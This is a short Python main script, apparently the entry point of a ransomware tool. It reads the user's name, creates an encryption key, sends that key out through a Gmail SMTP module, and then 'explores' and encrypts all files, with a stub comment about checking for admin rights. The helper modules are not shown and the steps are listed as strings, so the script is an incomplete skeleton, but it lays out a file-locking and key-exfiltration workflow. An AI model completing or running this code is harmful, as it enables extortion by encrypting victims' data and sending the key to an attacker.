#!/usr/bin/python
#coding:utf-8

from modules.crypt import crypt
from modules.network import smtpgmail
import os, sys

# ENVIRONMENT VARIABLE
keyname = os.environ["USERNAME"]

# DEFINE VARIABLES FOR THE FUNCTIONS NEEDED
cc = crypt.exploreThenCrypt()

# MAIN SCRIPT HERE



steps = ["cc.keyCreation(keyname)", "smtpgmail.sendTheKey()", "cc.exploreAll()"]
# CONDITION TO CHECK IF THE USER IS ADMIN
